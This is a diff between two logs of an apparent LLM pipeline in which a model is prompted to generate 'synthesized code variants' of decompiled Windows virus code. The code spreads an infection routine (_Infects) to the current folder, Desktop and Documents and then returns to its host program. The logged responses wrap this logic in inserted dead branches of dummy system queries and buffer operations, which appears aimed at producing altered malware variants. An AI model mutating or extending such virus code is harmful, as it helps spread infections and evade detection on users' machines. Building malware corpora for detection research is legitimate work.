@@ -2,10 +2,10 @@
 {
   "finish_reason": "stop",
   "attempts": 1,
-  "response_chars": 3396
+  "response_chars": 3211
 }
 
-=== PROMPT (7037 chars) ===
+=== PROMPT (7017 chars) ===
 
             You are an expert C developer generating synthesized code variants.
             Target architecture: x86
@@ -96,14 +96,15 @@
             ### INPUT CODE:
             
 #include "data_globals.h"
-#include <stdint.h>
 #include <windows.h>
+#include <stdint.h>
+#include <stdlib.h>
 
 void _WinMain_16(void)
 {
-    int32_t folderResult;
+    int32_t result;
     char currentDir[260];
-    uint8_t specialFolder[260];
+    uint8_t specialPath[260];
     uint32_t bytesRead;
     char modulePath[260];
     uint32_t fileSize;
@@ -125,14 +126,14 @@ void _WinMain_16(void)
     fileSize = GetFileSize(fileHandle, (LPDWORD)0x0);
     CloseHandle(fileHandle);
     _Infects();
-    folderResult = _GetSpecialFolder(specialFolder, "Desktop");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Desktop");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
-    folderResult = _GetSpecialFolder(specialFolder, "Personal");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Personal");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
     if (_VirusSize < fileSize) {
@@ -145,29 +146,29 @@ void _WinMain_16(void)
             Use ```c according to the detected input language. 
             
 
-=== RESPONSE (3396 chars) ===
+=== RESPONSE (3211 chars) ===
 ```c
 #include "data_globals.h"
-#include <stdint.h>
 #include <windows.h>
-#include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
+#include <stdio.h>
 #include <string.h>
 
 void _WinMain_16(void)
 {
-    int32_t folderResult;
+    int32_t result;
     char currentDir[260];
-    uint8_t specialFolder[260];
+    uint8_t specialPath[260];
     uint32_t bytesRead;
     char modulePath[260];
     uint32_t fileSize;
     HANDLE fileHandle;
 
-    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
+    /* --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) --- */
     volatile int dummy_x_1 = 7;
     if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
-        // Dummy logic – Category A (System info queries)
+        // Category A: System info queries (dummy logic)
         SYSTEM_INFO si;
         GetSystemInfo(&si);
 
@@ -182,13 +183,15 @@ void _WinMain_16(void)
         DWORD compNameSize = sizeof(computerName);
         GetComputerNameA(computerName, &compNameSize);
 
-        // Dummy hash loop (2 iterations)
-        volatile unsigned int hash = 2166136261U;
-        for (int i = 0; i < 2; ++i) {
-            hash ^= (unsigned int)si.dwNumberOfProcessors;
-            hash *= 16777619U;
+        // Dummy computation loop
+        volatile unsigned int checksum = 0;
+        for (int i = 0; i < 3; ++i) {
+            checksum ^= (si.dwNumberOfProcessors + st.wHour + i);
         }
-        (void)hash; // discard result
+
+        // Read an outer variable (allowed) without modifying it
+        checksum ^= (unsigned int)result;
+        (void)checksum; // discard
 
         // Clean up dummy buffers
         SecureZeroMemory(userName, sizeof(userName));
@@ -211,14 +214,14 @@ void _WinMain_16(void)
     fileSize = GetFileSize(fileHandle, (LPDWORD)0x0);
     CloseHandle(fileHandle);
     _Infects();
-    folderResult = _GetSpecialFolder(specialFolder, "Desktop");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Desktop");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
-    folderResult = _GetSpecialFolder(specialFolder, "Personal");
-    if (folderResult != 0) {
-        SetCurrentDirectoryA((LPCSTR)specialFolder);
+    result = _GetSpecialFolder(specialPath, "Personal");
+    if (result != 0) {
+        SetCurrentDirectoryA((LPCSTR)specialPath);
         _Infects();
     }
     if (_VirusSize < fileSize) {
@@ -226,31 +229,23 @@ void _WinMain_16(void)
         _ReturnToHost(modulePath);
     }
 
-    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
+    /* --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) --- */
     volatile int dummy_x_2 = 7;
     if ((dummy_x_2 * (dummy_x_2 + 1)) % 2 != 0) {
-        // Dummy logic – Category B (Memory & String operations)
+        // Category B: Memory & String operations (dummy logic)
         char *buf = (char*)malloc(128);
         if (buf) {
-            const char *fmt = "Size:%u";
-            unsigned int sz = 12345;
-            sprintf_s(buf, 128, fmt, sz);
-
+            memset(buf, 0xAA, 128);
+            sprintf_s(buf, 128, "Size:%u Dir:%s", (unsigned)_VirusSize, currentDir);
             size_t len = strlen(buf);
-            char *copy = (char*)malloc(len + 1);
-            if (copy) {
-                memcpy(copy, buf, len + 1);
 
-                // Dummy computation loop (3 iterations)
-                volatile int sum = 0;
-                for (int i = 0; i < 3; ++i) {
-                    sum += (int)copy[i];
-                }
-                (void)sum; // discard result
-
-                memset(copy, 0, len + 1);
-                free(copy);
+            // Dummy computation loop
+            volatile unsigned int sum = 0;
+            for (size_t i = 0; i < len && i < 5; ++i) {
+                sum += (unsigned int)buf[i];
             }
+            (void)sum; // discard
+
             SecureZeroMemory(buf, 128);
             free(buf);
         }
